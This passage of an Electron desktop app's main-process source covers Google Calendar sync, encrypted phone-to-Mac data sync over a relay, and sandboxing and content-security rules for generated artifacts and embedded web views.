            `/calendar/v3/calendars/${encodeURIComponent(calendarId)}/events?${params.toString()}`
        );

        if (result?.needsReconnect) return { needsReconnect: true, error: result.error };
        const code = result?.error?.code || result?.error?.status;
        if (code === 410 || code === 'GONE') return { expired: true };
        if (result?.error) {
            return { error: result.error.message || (typeof result.error === 'string' ? result.error : 'Failed to list events') };
        }

        (result?.items || []).forEach(ev => events.push(mapCalendarEvent(ev, calendarId)));
        nextSyncToken = result?.nextSyncToken || nextSyncToken;
        pageToken = result?.nextPageToken || null;
        if (!pageToken) break;
    }

    return { events, nextSyncToken };
}

function removeCalendarSyncTokens(email) {
    const tokens = settingsStore.get('calendarSyncTokens', {});
    let changed = false;
    for (const key of Object.keys(tokens)) {
        if (key.startsWith(`${email}|`)) { delete tokens[key]; changed = true; }
    }
    if (changed) settingsStore.set('calendarSyncTokens', tokens);
}

// Sync events. Per calendar: the first call does a full windowed fetch and
// stores Google's nextSyncToken; later calls send that token and get back
// only what changed since — a near-empty response when nothing did, which
// is what makes a 1-minute poll affordable. Tokens are machine-local (a
// server-side cursor per client, like OAuth tokens) under a single
// `calendarSyncTokens` settings key — one flat object keyed by
// "email|calendarId", NOT per-email keys, because electron-store splits
// dotted key paths into nested objects. A 410 GONE (expired token) or a
// 7-day-old full fetch falls back to a fresh full window so the -1/+3
// month range doesn't stay frozen at wherever the token chain started.
ipcMain.handle('calendar-sync-events', async (event, email, options = {}) => {
    try {
        const calendarIds = Array.isArray(options.calendarIds) && options.calendarIds.length > 0
            ? options.calendarIds
            : ['primary'];

        const allTokens = settingsStore.get('calendarSyncTokens', {});
        const calendars = [];
        const errors = [];
        let tokensDirty = false;

        for (const calendarId of calendarIds) {
            const tokenKey = `${email}|${calendarId}`;
            const saved = allTokens[tokenKey] || null;
            const fullAgeMs = saved?.fullAt ? Date.now() - new Date(saved.fullAt).getTime() : Infinity;
            const canIncrement = !!saved?.token && fullAgeMs < 7 * 24 * 3600 * 1000;

            let mode = 'incremental';
            let res = canIncrement
                ? await fetchCalendarEvents(email, calendarId, { syncToken: saved.token })
                : null;
            if (!res || res.expired) {
                if (res?.expired && allTokens[tokenKey]) {
                    // Dead cursor — drop it so a failed full fetch below
                    // doesn't leave it around to 410 again next call.
                    delete allTokens[tokenKey];
                    tokensDirty = true;
                }
                mode = 'full';
                res = await fetchCalendarEvents(email, calendarId, {
                    timeMin: options.timeMin,
                    timeMax: options.timeMax
                });
            }

            if (res.needsReconnect) return { error: res.error };
            if (res.error || res.expired) {
                // One broken calendar (revoked share, 404) shouldn't kill the
                // others — report it failed so the caller keeps its cache.
                errors.push(res.error || 'Sync token expired');
                calendars.push({ calendarId, failed: true });
                continue;
            }

            if (res.nextSyncToken) {
                allTokens[tokenKey] = {
                    token: res.nextSyncToken,
                    fullAt: mode === 'full' ? new Date().toISOString() : saved?.fullAt || new Date().toISOString()
                };
                tokensDirty = true;
            }
            calendars.push({ calendarId, mode, events: res.events });
        }

        if (tokensDirty) settingsStore.set('calendarSyncTokens', allTokens);

        // Fail the call only when every calendar failed.
        if (errors.length > 0 && calendars.every(c => c.failed)) {
            return { error: errors[0] };
        }
        return { calendars };
    } catch (err) {
        return { error: err.message };
    }
});

// Create event
ipcMain.handle('calendar-create-event', async (event, email, calendarId, eventData) => {
    try {
        const result = await calendarApiCall(
            email,
            'POST',
            `/calendar/v3/calendars/${encodeURIComponent(calendarId)}/events`,
            eventData
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to create event' };
        return { success: true, event: result };
    } catch (err) {
        return { error: err.message };
    }
});

// Update event
ipcMain.handle('calendar-update-event', async (event, email, calendarId, eventId, eventData) => {
    try {
        const result = await calendarApiCall(
            email,
            'PATCH',
            `/calendar/v3/calendars/${encodeURIComponent(calendarId)}/events/${encodeURIComponent(eventId)}`,
            eventData
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to update event' };
        return { success: true, event: result };
    } catch (err) {
        return { error: err.message };
    }
});

// Get single event (used to read RRULE when trimming a recurring series
// for "this and following" deletes).
ipcMain.handle('calendar-get-event', async (event, email, calendarId, eventId) => {
    try {
        const result = await calendarApiCall(
            email,
            'GET',
            `/calendar/v3/calendars/${encodeURIComponent(calendarId)}/events/${encodeURIComponent(eventId)}`
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to fetch event' };
        return { success: true, event: result };
    } catch (err) {
        return { error: err.message };
    }
});

// Delete event
ipcMain.handle('calendar-delete-event', async (event, email, calendarId, eventId) => {
    try {
        const result = await calendarApiCall(
            email,
            'DELETE',
            `/calendar/v3/calendars/${encodeURIComponent(calendarId)}/events/${encodeURIComponent(eventId)}`
        );

        if (result?.needsReconnect) return { error: result.error };
        if (result?.error) return { error: result.error.message || 'Failed to delete event' };
        return { success: true };
    } catch (err) {
        return { error: err.message };
    }
});

// --- Phone <-> Mac channel ------------------------------------------------
// The Mac is the "host" of the end-to-end-encrypted phone<->Mac channel. The
// channel service (js/channel/desktop-channel.mjs) is ESM, so it is loaded
// with a dynamic import. Its identity, routing id and paired phones live in
// the machine-local settings store -- like OAuth tokens, they must not sync.
// (`desktopChannel` itself is declared near the top of the file so the startup
// sync merge can safely reference it before this code runs.)

// Push debounce: when the user is mid-edit (autosave fires every keystroke,
// schedule rebuilds may touch many items in a tick), coalesce the burst into
// a single `data-changed` push. Phones receive one nudge per quiet window
// rather than hundreds of redundant pulls.
const PUSH_DEBOUNCE_MS = 500;
let pushPendingKeys = null;     // Set<string> of keys touched since last fire
let pushDebounceTimer = null;
function notifyChannelDataChanged(key) {
    if (!desktopChannel || SYNC_EXCLUDE_KEYS.has(key)) return;
    if (!pushPendingKeys) pushPendingKeys = new Set();
    pushPendingKeys.add(key);
    if (pushDebounceTimer) clearTimeout(pushDebounceTimer);
    pushDebounceTimer = setTimeout(() => {
        const keys = Array.from(pushPendingKeys || []);
        pushPendingKeys = null;
        pushDebounceTimer = null;
        if (keys.length === 0 || !desktopChannel) return;
        try {
            const reached = desktopChannel.broadcastToPeers({ type: 'data-changed', keys });
            if (reached > 0) console.log(`[channel] pushed data-changed to ${reached} peer(s):`, keys.join(', '));
        } catch (err) {
            console.warn('[channel] push failed:', err.message);
        }
    }, PUSH_DEBOUNCE_MS);
}

// The production relay (relay/worker/ — Cloudflare Workers). Set this once
// `wrangler deploy` has run, to the deployed URL, e.g.
//   'wss://anjadhe-relay.<your-subdomain>.workers.dev'
// or a custom domain such as 'wss://relay.anjadhe.com'. The shipped app
// reaches users' phones through this — over cellular or any network. Until it
// is set, the app falls back to a relay on the local network.
const PRODUCTION_RELAY_URL = 'wss://anjadhe-relay.ram-bakthavachalam.workers.dev';

function getChannelRelayUrl() {
    // A developer override always wins, e.g. ANJADHE_RELAY_URL=ws://127.0.0.1:8787
    if (process.env.ANJADHE_RELAY_URL) return process.env.ANJADHE_RELAY_URL;
    // The hosted relay — what real users reach, on any network.
    if (PRODUCTION_RELAY_URL) return PRODUCTION_RELAY_URL;
    // No hosted relay configured yet: a relay on the local network, reachable
    // by phones on the same Wi-Fi. Use this Mac's LAN IPv4 so one URL works
    // for the Mac and the phone alike.
    const nets = require('os').networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const ni of nets[name] || []) {
            if (ni.family === 'IPv4' && !ni.internal) return `ws://${ni.address}:8787`;
        }
    }
    return 'ws://127.0.0.1:8787';
}

// --- channel data sync (phone <-> Mac) -----------------------------------
const SYNC_EPOCH = '1970-01-01T00:00:00.000Z';

// The Mac's syncable dataset: every non-excluded key with the modifiedAt
// recorded in the sync journal. Live keys come back as
// `{value, modifiedAt}`; tombstones as `{deleted: true, modifiedAt}` (no
// value) so deletes propagate to the phone the same way updates do.
// Last-writer-wins per key, same as the iCloud journal merge.
function readMacSyncSet(includeTombstones) {
    const set = {};
    try {
        ensureSyncDir();
        for (const file of fs.readdirSync(machineSyncDir)) {
            if (!file.endsWith('.json') || file === 'machine-info.json') continue;
            let entry;
            try {
                entry = decryptOrParseJSON(fs.readFileSync(path.join(machineSyncDir, file), 'utf8'));
            } catch { continue; }
            if (!entry || !entry.key || SYNC_EXCLUDE_KEYS.has(entry.key)) continue;
            if (entry.deleted) {
                if (!includeTombstones) continue;
                set[entry.key] = { deleted: true, modifiedAt: entry.modifiedAt || SYNC_EPOCH };
            } else {
                set[entry.key] = { value: entry.value, modifiedAt: entry.modifiedAt || SYNC_EPOCH };
            }
        }
    } catch (err) {
        console.warn('[channel] reading sync journal failed:', err.message);
    }
    // Pending journal writes (debounced — not yet on disk). These are the
    // freshest by definition, so they overwrite anything we just read.
    for (const [key, entry] of pendingJournal) {
        if (SYNC_EXCLUDE_KEYS.has(key)) continue;
        if (entry.deleted) {
            if (!includeTombstones) { delete set[key]; continue; }
            set[key] = { deleted: true, modifiedAt: entry.modifiedAt };
        } else {
            set[key] = { value: entry.value, modifiedAt: entry.modifiedAt };
        }
    }
    // Include data-store keys with no journal entry yet (treated as oldest).
    const all = dataStore.getAll();
    for (const key of Object.keys(all)) {
        if (SYNC_EXCLUDE_KEYS.has(key) || set[key]) continue;
        set[key] = { value: all[key], modifiedAt: SYNC_EPOCH };
    }
    return set;
}

// Apply one change from the phone: write the value and a journal entry that
// keeps the phone's modifiedAt, so the change also reaches the user's other
// Macs through the normal iCloud journal merge.
function applyPhoneChange(key, value, modifiedAt) {
    if (SYNC_EXCLUDE_KEYS.has(key)) return;
    dataStore.set(key, value);
    try {
        ensureSyncDir();
        fs.writeFileSync(
            path.join(machineSyncDir, keyToFilename(key)),
            encryptJSON({ key, value, modifiedAt, machineId }),
        );
    } catch (err) {
        console.warn('[channel] sync journal write failed for', key, err.message);
    }
}

// Apply a delete from the phone: drop the live value, and write a tombstone
// journal entry so the delete reaches the user's other Macs through the
// iCloud merge (the merge path already understands `deleted: true`).
function applyPhoneDelete(key, modifiedAt) {
    if (SYNC_EXCLUDE_KEYS.has(key)) return;
    try { dataStore.delete(key); } catch {}
    try {
        ensureSyncDir();
        fs.writeFileSync(
            path.join(machineSyncDir, keyToFilename(key)),
            encryptJSON({ key, value: null, deleted: true, modifiedAt, machineId }),
        );
    } catch (err) {
        console.warn('[channel] sync journal tombstone write failed for', key, err.message);
    }
}

// Merge the phone's set into the Mac, then hand the Mac's set back.
// Legacy full-set sync — kept for back-compat with phone builds that
// pre-date the delta protocol below. New builds use sync-manifest +
// sync-values, which only transfers values for keys that actually changed.
function handleChannelSync(phoneSet) {
    const macSet = readMacSyncSet();
    let applied = 0;
    for (const key of Object.keys(phoneSet || {})) {
        const incoming = phoneSet[key];
        if (!incoming || !incoming.modifiedAt || SYNC_EXCLUDE_KEYS.has(key)) continue;
        const mine = macSet[key];
        if (!mine || new Date(incoming.modifiedAt) > new Date(mine.modifiedAt)) {
            applyPhoneChange(key, incoming.value, incoming.modifiedAt);
            macSet[key] = { value: incoming.value, modifiedAt: incoming.modifiedAt };
            applied++;
        }
    }
    console.log(`[channel] sync — applied ${applied} change(s) from phone, returned ${Object.keys(macSet).length} key(s)`);
    return { type: 'sync-result', changes: macSet, applied };
}

// Stage 1 of the delta sync: the phone sends just timestamps; the Mac
// decides per key whether to send a value (or a tombstone) down, ask for
// one up, or skip. Values only travel for keys that actually need them —
// payload scales with changes since last sync, not with total data size.
function handleSyncManifest(phoneManifest) {
    const macSet = readMacSyncSet(true); // include tombstones for delete propagation
    const send = {}; // {key: {value | deleted, modifiedAt}} — Mac side wins
    const want = []; // [key, ...] — phone is newer; Mac wants stage-2 values

    const seen = new Set();
    for (const key of Object.keys(macSet)) {
        if (SYNC_EXCLUDE_KEYS.has(key)) continue;
        seen.add(key);
        const mine = macSet[key];
        const theirs = phoneManifest && phoneManifest[key];
        if (!theirs) {
            // Phone doesn't have this key at all — push it (live or tombstone).
            send[key] = mine;
        } else if (new Date(mine.modifiedAt) > new Date(theirs)) {
            send[key] = mine;
        } else if (new Date(theirs) > new Date(mine.modifiedAt)) {
            want.push(key);
        }
        // equal timestamps → in sync, skip
    }
    // Keys the phone has but the Mac doesn't — pull them up.
    for (const key of Object.keys(phoneManifest || {})) {
        if (SYNC_EXCLUDE_KEYS.has(key) || seen.has(key)) continue;
        want.push(key);
    }

    console.log(`[channel] sync-manifest — sending ${Object.keys(send).length} key(s) down, requesting ${want.length} up`);
    return { type: 'sync-plan', send, want };
}

// Stage 2 of the delta sync: the phone uploads only the keys the Mac
// asked for. Re-checks modifiedAt at apply time so a concurrent Mac edit
// between the two stages doesn't get clobbered by a stale phone value.
// Each entry is either `{value, modifiedAt}` (update) or
// `{deleted: true, modifiedAt}` (tombstone — propagate the delete).
function handleSyncValues(phoneValues) {
    const macSet = readMacSyncSet(true);
    let applied = 0;
    for (const key of Object.keys(phoneValues || {})) {
        const incoming = phoneValues[key];
        if (!incoming || !incoming.modifiedAt || SYNC_EXCLUDE_KEYS.has(key)) continue;
        const mine = macSet[key];
        if (mine && new Date(mine.modifiedAt) >= new Date(incoming.modifiedAt)) continue;
        if (incoming.deleted) applyPhoneDelete(key, incoming.modifiedAt);
        else applyPhoneChange(key, incoming.value, incoming.modifiedAt);
        applied++;
    }
    console.log(`[channel] sync-values — applied ${applied} change(s) from phone`);
    return { type: 'sync-values-ack', applied };
}

// Decrypted requests from a paired phone are dispatched here.
async function dispatchChannelRequest(message) {
    if (!message || typeof message.type !== 'string') {
        return { ok: false, error: 'malformed request' };
    }
    if (message.type === 'ping') {
        return { type: 'pong', at: new Date().toISOString() };
    }
    if (message.type === 'sync') {
        return handleChannelSync(message.changes);
    }
    if (message.type === 'sync-manifest') {
        return handleSyncManifest(message.manifest);
    }
    if (message.type === 'sync-values') {
        return handleSyncValues(message.values);
    }
    return { ok: false, error: 'unsupported request type: ' + message.type };
}

// The channel is renderer-driven: main never connects to the relay on its
// own. AppManager calls electronChannel.ensure() at startup only when the
// `mobilesync` feature flag (js/core/features.js) is on, so builds with the
// flag off make no relay connections at all. Idempotent — one attempt per
// launch, matching the old start-once-at-boot behavior.
let channelInitStarted = false;
async function initDesktopChannel() {
    if (channelInitStarted) return;
    channelInitStarted = true;
    try {
        const modUrl = require('url').pathToFileURL(
            path.join(__dirname, 'js', 'channel', 'desktop-channel.mjs'),
        ).href;
        const { createDesktopChannel } = await import(modUrl);
        desktopChannel = createDesktopChannel({
            storage: {
                get: (key) => settingsStore.get(key, null),
                set: (key, value) => settingsStore.set(key, value),
            },
            relayUrl: getChannelRelayUrl(),
            onRequest: dispatchChannelRequest,
        });
        desktopChannel.onPaired((pub) => broadcastToAllWindows('channel-paired', { pub }));
        await desktopChannel.start();
        console.log('[channel] connected to relay', getChannelRelayUrl());
    } catch (err) {
        // Reaching here means channel *setup* failed (e.g. the ESM module
        // could not load) -- not merely that the relay is down. An
        // unreachable relay is handled inside the endpoint, which keeps
        // retrying on its own, so it never breaks app startup.
        console.warn('[channel] not started:', (err && err.message) || err);
    }
}

// IPC: phone<->Mac channel and device pairing
ipcMain.handle('channel-ensure', () => {
    initDesktopChannel(); // non-blocking — connects to the relay in the background
    return { ok: true };
});
ipcMain.handle('channel-get-info', () => {
    if (!desktopChannel) return { available: false };
    return {
        available: true,
        connected: desktopChannel.isConnected(),
        ...desktopChannel.getPublicInfo(),
        pairing: desktopChannel.isPairing(),
        devices: desktopChannel.listPairedDevices(),
    };
});
ipcMain.handle('channel-begin-pairing', async () => {
    if (!desktopChannel) return { error: 'channel unavailable' };
    const offer = desktopChannel.beginPairing();
    try {
        const QRCode = require('qrcode');
        const qrSvg = await QRCode.toString(JSON.stringify(offer), {
            type: 'svg', margin: 1, errorCorrectionLevel: 'M',
        });
        return { offer, qrSvg };
    } catch (err) {
        return { offer, error: 'qr generation failed: ' + ((err && err.message) || err) };
    }
});
ipcMain.handle('channel-cancel-pairing', () => {
    if (desktopChannel) desktopChannel.cancelPairing();
    return { ok: true };
});
ipcMain.handle('channel-list-devices', () => (
    desktopChannel ? desktopChannel.listPairedDevices() : []));
ipcMain.handle('channel-remove-device', (_event, pub) => {
    if (desktopChannel) desktopChannel.removePairedDevice(pub);
    return { ok: true };
});

// Composed guest HTML for sandboxed user apps, keyed by app id. The renderer
// stages it here; the anjadhe-userapp:// handler (above) serves it. Held only in
// memory — it's cheap to recompose on reload, and nothing here is persisted.
const stagedUserApps = new Map();
ipcMain.handle('userapp-stage', (_event, { id, html } = {}) => {
    if (!id || typeof html !== 'string') return false;
    stagedUserApps.set(String(id), html);
    return true;
});
ipcMain.handle('userapp-unstage', (_event, id) => {
    stagedUserApps.delete(String(id));
    return true;
});

app.whenReady().then(async () => {
    createMenu();
    RemoteConfig.load(); // non-blocking — fetches in background

    // User-built apps: keep the agent docs current with this release, then
    // watch for hot reload — both no-op until ~/Anjadhe/apps exists. Docs
    // refresh runs before the watcher starts so the rewrite (when a release
    // changed them) doesn't fire a spurious change event.
    refreshUserAppsDocs();
    startUserAppsWatcher();

    // Serve Maker artifacts into their sandboxed <webview>. host = artifact id,
    // pathname = file within it; resolveArtifactFile clamps every request to
    // inside the artifact folder and to the extension allowlist, so a generated
    // page (or a crafted ../ link) can't read anything else on disk.
    // M6: a strict per-response CSP so a generated artifact (built by a local
    // model that may have ingested injected web text) can't phone home. It may
    // run its own inline scripts/styles and use data:/blob: assets, but
    // `connect-src 'none'` kills fetch/XHR/WebSocket/sendBeacon and `img-src`
    // excludes remote hosts, so no fetch- OR tracking-pixel exfiltration.
    // `corsEnabled:false` on the scheme didn't stop `no-cors` requests; this does.
    const ARTIFACT_CSP = [
        "default-src 'none'",
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob:",
        "font-src 'self' data:",
        "media-src 'self' data: blob:",
        "connect-src 'none'",
        "form-action 'none'",
        "base-uri 'none'",
        "frame-ancestors 'self'"
    ].join('; ');
    const artifactProtocolHandler = async (request) => {
        try {
            const url = new URL(request.url);
            const id = decodeURIComponent(url.hostname);
            let rel = decodeURIComponent(url.pathname).replace(/^\/+/, '');
            if (!rel || rel.endsWith('/')) rel += 'index.html';
            const abs = resolveArtifactFile(id, rel);
            if (!abs || !fs.existsSync(abs)) {
                return new Response('Not found', { status: 404 });
            }
            const mime = ARTIFACT_MIME[path.extname(abs).toLowerCase()] || 'application/octet-stream';
            const data = fs.readFileSync(abs);
            return new Response(data, { status: 200, headers: {
                'content-type': mime,
                'content-security-policy': ARTIFACT_CSP
            } });
        } catch (e) {
            return new Response('Bad request', { status: 400 });
        }
    };
    // protocol.handle registers on the DEFAULT session only. The Maker preview
    // <webview> runs in its own `persist:maker` partition (a separate session),
    // so the handler must be registered there too — otherwise artifact requests
    // from the webview have no handler and the page never loads.
    const { session: electronSession } = require('electron');
    const registerArtifactProtocol = (sess) => {
        try { sess.protocol.handle('anjadhe-artifact', artifactProtocolHandler); }
        catch (e) { console.error('[maker] protocol register failed:', e.message); }
    };
    registerArtifactProtocol(electronSession.defaultSession);
    registerArtifactProtocol(electronSession.fromPartition('persist:maker'));

    // M6 (defense-in-depth): the Maker preview partition should ONLY ever load
    // the artifact scheme. Cancel any other outbound request (http(s), ws, …) at
    // the session level, so even a CSP bypass can't exfiltrate from an artifact.
    try {
        const makerSession = electronSession.fromPartition('persist:maker');
        makerSession.webRequest.onBeforeRequest({ urls: ['<all_urls>'] }, (details, callback) => {
            const ok = /^(anjadhe-artifact:|about:blank|data:|blob:)/i.test(details.url || '');
            if (!ok) console.warn('[maker] blocked outbound request from artifact:', String(details.url).slice(0, 120));
            callback({ cancel: !ok });
        });
    } catch (e) {
        console.error('[maker] could not install network block:', e.message);
    }

    // Sandboxed user apps (SECURITY H3): the trusted renderer stages the fully
    // composed guest HTML (guest runtime + the app's own code, carrying its own
    // <meta> CSP), and we serve it from anjadhe-userapp://<id>/ so it loads with
    // its own origin — NOT inheriting the main window's strict CSP the way an
    // about:srcdoc frame would. The frame is sandboxed (opaque origin), so this
    // origin still can't touch the host; serving it here only fixes the CSP.
    try {
        electronSession.defaultSession.protocol.handle('anjadhe-userapp', async (request) => {
            try {
                const id = decodeURIComponent(new URL(request.url).hostname);
                const html = stagedUserApps.get(id);
                if (html == null) return new Response('Not found', { status: 404 });
                return new Response(html, { status: 200, headers: { 'content-type': 'text/html; charset=utf-8' } });
            } catch (e) {
                return new Response('Bad request', { status: 400 });
            }
        });
    } catch (e) {
        console.error('[user-app] protocol register failed:', e.message);
    }

    // One-time migration: MLX was removed as a local backend (it never
    // worked reliably enough to keep). Anyone who had it selected falls
    // back to Ollama, the stale config keys are dropped, and the managed
    // virtualenv + server log are deleted to reclaim disk — the venv can
    // run to hundreds of MB once mlx-lm and a model's deps are installed.
    try {
        if (settingsStore.get('localBackend', 'ollama') === 'mlx') {
            settingsStore.set('localBackend', 'ollama');
        }
        settingsStore.delete('mlxEndpoint');
        settingsStore.delete('mlxModel');
        const _ud = app.getPath('userData');
        for (const stale of [path.join(_ud, 'mlx-venv'), path.join(_ud, 'mlx-server.log')]) {
            try { fs.rmSync(stale, { recursive: true, force: true }); } catch {}
        }
    } catch (e) {
        console.warn('[migrate] MLX cleanup skipped:', e && (e.message || e));
    }

    // Only spin up the local Ollama runtime when the assistant actually uses
    // it. With the custom (OpenAI-compatible server) provider selected,
    // auto-starting Ollama just wastes RAM/CPU on launch.
    // Switching back to Local/Auto at runtime starts it lazily (llm-set-provider).
    // One-time migration: the Anthropic/Claude remote path was removed
    // (2026-07 positioning — model traffic only reaches hardware the user
    // owns). Users who had provider 'remote' (or 'anthropic', the literal the
    // old low-RAM wizard stored) fall back to auto; the dormant cloud API key
    // is deleted outright — there is no UI that could use it anymore.
    try {
        const _prov = settingsStore.get('llmProvider', 'auto');
        if (_prov === 'remote' || _prov === 'anthropic') {
            settingsStore.set('llmProvider', 'auto');
            console.log(`[migrate] llmProvider '${_prov}' → 'auto' (cloud AI path removed)`);
        }
        if (settingsStore.get('anthropicApiKey', null) !== null) {
            settingsStore.delete('anthropicApiKey');
            console.log('[migrate] Deleted stored Anthropic API key (cloud AI path removed)');
        }
        settingsStore.delete('anthropicModel');
    } catch (e) {
        console.warn('[migrate] Anthropic cleanup skipped:', e && (e.message || e));
    }

    const _startupProvider = settingsStore.get('llmProvider', 'auto');
    if ((_startupProvider === 'auto' || _startupProvider === 'local') && getLocalBackend() === 'ollama') {
        await OllamaManager.start();
    } else {
        // llama.cpp needs no daemon at launch — llama-server spawns lazily on
        // the first chat, once the renderer says which model to load.
        console.log(`[startup] Skipping Ollama auto-start (provider=${_startupProvider}, backend=${getLocalBackend()})`);
    }
    createWindow();
    UpdaterManager.start(); // non-blocking — checks GitHub in background
    // Phone<->Mac channel deliberately NOT started here: the renderer
    // requests it via 'channel-ensure' only when the `mobilesync` feature
    // flag is on (see initDesktopChannel).
    // Once per launch, prune sync-journal tombstones older than the TTL.
    // Cheap (a few dozen file reads at most) and keeps the journal dir
    // from accumulating dead entries over years of use.
    pruneOldMacTombstones();
    // Apply any pending storage-key renames before the renderer reads
    // data. STORAGE_MIGRATIONS is empty today; entries get added when
    // a rename ships, and the same list runs on the phone.
    runStorageMigrations();

    // Lock app when macOS screen locks or sleeps
    powerMonitor.on('lock-screen', () => {
        broadcastToAllWindows('app-lock');
    });

    // Forward power state to renderer for smart email polling
    powerMonitor.on('suspend', () => {
        broadcastToAllWindows('power-state', 'suspend');
    });
    powerMonitor.on('resume', () => {
        broadcastToAllWindows('power-state', 'resume');
    });
});

// Minimum gap between the previous backup and a quit-time backup.
// Prevents a fast open/close loop from flooding the 7-slot retention
// window with near-identical snapshots and evicting older history.
const QUIT_BACKUP_DEBOUNCE_MS = 5 * 60 * 1000;

app.on('will-quit', () => {
    // Session-end backup. Complements the hourly timer — captures the last
    // state before every quit, and bridges the restart gap where the
    // setInterval-anchored schedule can miss if the user restarts within
    // the interval window.
    try {
        const settings = getBackupSettings();
        const lastMs = settings.lastBackup ? new Date(settings.lastBackup).getTime() : 0;
        if (settings.enabled && Date.now() - lastMs >= QUIT_BACKUP_DEBOUNCE_MS) {
            performBackup('auto');
        }
    } catch (err) {
        console.error('Quit-time backup failed:', err);
    }
    OllamaManager.stop();
    LlamaCppManager.stop();
});

// Per-process rate limiter for shell.openExternal calls from <webview>
// popups. A hostile page can fire a window.open() loop and spawn many
// default-browser tabs; we cap to 5 per 5-second window per webContents.
const _browseOpenExternalCounters = new WeakMap();
const BROWSE_OPEN_EXTERNAL_LIMIT = 5;
const BROWSE_OPEN_EXTERNAL_WINDOW_MS = 5000;

function _shouldAllowOpenExternal(contents) {
    const now = Date.now();
    const ledger = _browseOpenExternalCounters.get(contents) || [];
    const recent = ledger.filter(t => now - t < BROWSE_OPEN_EXTERNAL_WINDOW_MS);
    if (recent.length >= BROWSE_OPEN_EXTERNAL_LIMIT) {
        _browseOpenExternalCounters.set(contents, recent);
        return false;
    }
    recent.push(now);
    _browseOpenExternalCounters.set(contents, recent);
    return true;
}

// ── Browse privacy / anti-tracking ──
// Tracker request blocking (EasyPrivacy + EasyList), 3rd-party cookie
// stripping, DNT/Sec-GPC headers, origin-only Referer on cross-origin,
// tracking query-param removal, WebRTC IP leak fix, plus a per-site
// allowlist for sites where blocking breaks login/embed flows.
//
// Persistence: the per-site disable list is stored in dataStore under
// `app_browse_privacy_allowlist` so it round-trips through the same
// sync journal that carries the rest of the user's data.

const PRIVACY_ALLOWLIST_KEY = 'app_browse_privacy_allowlist';
let _privacyAllowlist = new Set();

function _loadPrivacyAllowlist() {
    try {
        const v = dataStore.get(PRIVACY_ALLOWLIST_KEY);
        const arr = (v && Array.isArray(v.disabledHosts)) ? v.disabledHosts : [];
        _privacyAllowlist = new Set(arr.map(h => String(h || '').toLowerCase()).filter(Boolean));
    } catch (e) {
        console.warn('[privacy] allowlist load failed:', e.message);
        _privacyAllowlist = new Set();
    }
}

function _savePrivacyAllowlist() {
    try {
        dataStore.set(PRIVACY_ALLOWLIST_KEY, {
            disabledHosts: Array.from(_privacyAllowlist),
            modifiedAt: Date.now()
        });
    } catch (e) {
        console.warn('[privacy] allowlist save failed:', e.message);
    }
}

// eTLD+1 ("registrable domain") detection via the real Public Suffix List.
// Used by the third-party-cookie strip, per-site protection toggle, and
// Referer logic — anywhere we need to decide whether two hostnames belong
// to the same site. Earlier hand-maintained tables missed common suffixes
// (github.io, pages.dev, *.amazonaws.com, *.web.app, …) which silently
// degraded those guarantees on a non-trivial slice of the web.
const _psl = require('psl');
const _IP_RE = /^(?:\d{1,3}\.){3}\d{1,3}$|^\[?[0-9a-f:]+\]?$/i;

function _eTLDPlusOne(hostname) {
    if (!hostname) return '';
    const h = String(hostname).toLowerCase().replace(/\.$/, '');
    // IPs and bare hostnames (localhost, intranet names) have no eTLD —
    // return them verbatim so same-host comparisons still work and we
    // don't accidentally collapse them to a misleading suffix.
    if (_IP_RE.test(h)) return h;
    if (!h.includes('.')) return h;
    try {
        const got = _psl.get(h);
        return got || h;
    } catch {
        return h;
    }
}

function _topFrameUrl(details) {
    try {
        if (details.frame && details.frame.top && details.frame.top.url) {
            return details.frame.top.url;
        }
    } catch {}
    return details.documentURL || details.referrer || '';
}

function _isProtectedTopHost(topUrl) {
    if (!topUrl) return true; // be safe by default
    try {
        const host = _eTLDPlusOne(new URL(topUrl).hostname);
        return !_privacyAllowlist.has(host);
    } catch { return true; }
}

// Push a per-block notification to all open windows. Renderer matches
// webContentsId to its tab and increments the shield badge.
function _broadcastBlock(webContentsId, topUrl, blockedHost) {
    try {
        BrowserWindow.getAllWindows().forEach(w => {
            if (!w.isDestroyed()) {
                w.webContents.send('browse-privacy-blocked', {
                    webContentsId, topUrl, blockedHost
                });
            }
        });
    } catch {}
}

// Lock down any <webview> the renderer attaches (Browse sub-app). Strip
// the preload, force Node off, and keep the guest sandboxed so a hostile
// page can't reach into Anjadhe. Also intercept window.open so popups
// open in the user's default browser instead of an unmanaged window —
// rate-limited so a script can't spam the user's browser.
app.on('web-contents-created', (_event, contents) => {
    contents.on('will-attach-webview', (_e, webPreferences, params) => {
        delete webPreferences.preload;
        webPreferences.nodeIntegration = false;
        webPreferences.nodeIntegrationInWorker = false;
        webPreferences.nodeIntegrationInSubFrames = false;
        webPreferences.contextIsolation = true;
        webPreferences.sandbox = true;
        webPreferences.webSecurity = true;

        // Defense-in-depth: if anything (a renderer-side bug, an attacker-
        // influenced URL parameter) ever sets the webview's `src` to a
        // non-http(s) target at attach time, force it to about:blank
        // instead of allowing file://, javascript:, data:, chrome:, etc.
        // anjadhe-artifact:// is allowed — it's our own contained scheme that
        // hosts Maker artifacts (the handler clamps every request to one
        // artifact folder); file:/javascript:/data: stay blocked.
        if (params && typeof params.src === 'string') {
            if (!/^(https?:\/\/|anjadhe-artifact:\/\/|about:blank)/i.test(params.src)) {
                params.src = 'about:blank';
            }
        }
    });
    if (contents.getType && contents.getType() === 'webview') {
        const { session: _ses, shell: _shell } = require('electron');
        // Maker artifacts run in their own `persist:maker` partition and are
        // NOT part of the Browse tab system, so links in them are handled
        // differently below (external → OS browser, internal → same frame).
        let _isMaker = false;
        try { _isMaker = contents.session === _ses.fromPartition('persist:maker'); } catch {}

        // target="_blank" / window.open from a page: open it as a new tab
        // inside Anjadhe's own browser instead of the OS default browser.
        // We always deny the native popup and hand the URL to the renderer
        // that owns this webview (matched by webContentsId, like the
        // privacy-block stream). Non-http(s) and programmatic dispositions
        // are dropped outright; the rate limiter caps tab-spawn spam.
        contents.setWindowOpenHandler(({ url, disposition }) => {
            if (!/^https?:\/\//i.test(url)) return { action: 'deny' };
            // Maker: a document's source links (target="_blank") open in the
            // user's default browser — there's no in-app browser tab to host
            // them, and an artifact shouldn't navigate itself away.
            if (_isMaker) {
